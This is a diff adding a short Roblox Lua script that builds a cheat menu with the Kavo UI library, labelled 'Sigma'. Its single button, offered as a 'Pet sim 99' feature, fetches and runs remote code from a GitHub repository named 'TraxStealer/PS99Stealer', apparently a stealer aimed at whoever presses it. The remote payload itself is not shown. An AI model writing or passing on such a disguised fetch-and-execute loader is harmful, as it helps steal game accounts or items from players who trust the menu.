@@ -1,0 +1,12 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Sigma", "Synapse")
+
+local Tab = Window:NewTab("Sigma")
+local Section = Tab:NewSection("Sigma")
+
+Section:NewLabel("Sigma")
+
+
+Section:NewButton("Pet sim 99", "OG", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
+end)
